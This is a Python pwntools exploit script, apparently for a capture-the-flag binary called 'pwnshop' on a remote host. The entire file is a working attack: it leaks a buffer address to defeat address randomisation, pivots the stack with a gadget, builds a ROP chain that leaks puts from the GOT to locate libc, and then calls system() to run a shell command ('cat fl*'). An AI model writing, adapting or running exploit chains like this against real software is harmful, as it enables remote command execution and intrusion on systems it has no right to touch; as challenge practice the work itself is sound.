from pwn import *

context.arch = 'x86_64'
print(context.terminal)

STATIC_BUF_BASE = 0x40c0 # static text buffer offset within binary - we can write to this buffer, but it is not on an executable section

# p = process('./pwnshop')
p = remote('206.189.121.131', 31769)

# libc = ELF('./libc.self')
libc = ELF('./libc.target') # got target libc version by searching puts address on https://libc.blukat.me/?q=puts%3A76a0
elf = ELF('./pwnshop')

# retrieve address of buffer
print(p.recv())
p.sendline('2')
print(p.recv())
p.sendline('offset')
print(p.recv())
p.sendline('99999999')
data = p.recv()
addrBin = data[14:22] # clean up extra junk in the leak
if addrBin[-2:].decode('latin-1') == '? ':
    addrBin = addrBin[:-2]
if addrBin[-1:].decode('latin-1') == ' ':
    addrBin = addrBin[:-1]
static_buffer = int.from_bytes(addrBin, 'little')
print(data)

# calculate binary offset
OFFSET = static_buffer - STATIC_BUF_BASE
print(f"Buffer address: {hex(static_buffer)}")
print(f"Binary offset: {hex(OFFSET)}")

# clean up stdin buffer after whatever we just did
p.send('2')
print(p.recv())

# put data in buffer
p.sendline('2')
print(p.recv())
p.sendline('hax')
print(p.recv())
p.sendline('13.37')
print(p.recv())
p.sendline('cat fl*') # command to execute goes here
print(p.recv())


# here's how the overflow looks
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[ROP2  ][ROP3  ][ROP4  ][ROP5  ][ROP1  ]
#                                         ^40     ^                       ^72     ^80
# buffer                                                          buffer | end of buffer
# ROP1: 0x0000000000001219 : sub rsp, 0x28 ; ret #subtract 40 from RSP AFTER this gadget has been popped when RSP is buffer+80
# ROP2..ROP5: now we have 4 8-byte chunks on the stack we can use to put ROP stuff.  these go inside the buffer.

PUTS_GOT = elf.got['puts'] + OFFSET
PUTS_PLT = elf.plt['puts'] + OFFSET
POP_RDI = 0x00000000000013c3 + OFFSET # 0x00000000000013c3 : pop rdi ; ret
MAIN_ADDR = 0x000010a0 + OFFSET
RSP_SUBTRACT_40 = 0x0000000000001219 + OFFSET
print(f"PUTS_GOT = {hex(PUTS_GOT)}")
print(f"PUTS_PLT = {hex(PUTS_PLT)}")
print(f"POP_RDI = {hex(POP_RDI)}")
print(f"MAIN_ADDR = {hex(MAIN_ADDR)}")
print(f"RSP_SUBTRACT_40 = {hex(RSP_SUBTRACT_40)}")

# ROP chain to get address of puts in libc
p.sendline('1') # buy
print(p.recv())
payload = ('A' * 40).encode('latin-1')
payload += p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT)
payload += p64(MAIN_ADDR)
payload += p64(RSP_SUBTRACT_40)
print(payload)
p.send(payload)
output = p.recv()
print(output)
puts_address_bytes = output.decode('latin-1').split('\n')[0].encode('latin-1')
puts_address = int.from_bytes(puts_address_bytes, 'little')
print(f"Got address of puts: {hex(puts_address)}")

# calculate offsets and find address of system
libc_base = puts_address - libc.symbols['puts']
print(f"Libc base: {hex(libc_base)}")
libc.address = libc_base
system_addr = libc.symbols['system']

# ROP chain to call system with the contents of the buffer from the "sell" selection
p.sendline('1')
print(p.recv())
payload = ('A' * 40).encode('latin-1')
payload += p64(POP_RDI) + p64(static_buffer) + p64(system_addr)
payload += p64(MAIN_ADDR) + p64(RSP_SUBTRACT_40) # this is just filler
# but it's important that RSP_SUBTRACT_40 gadget is the one that overflows so we have space to do the gadgets to call system
p.sendline(payload)
print(p.recv())
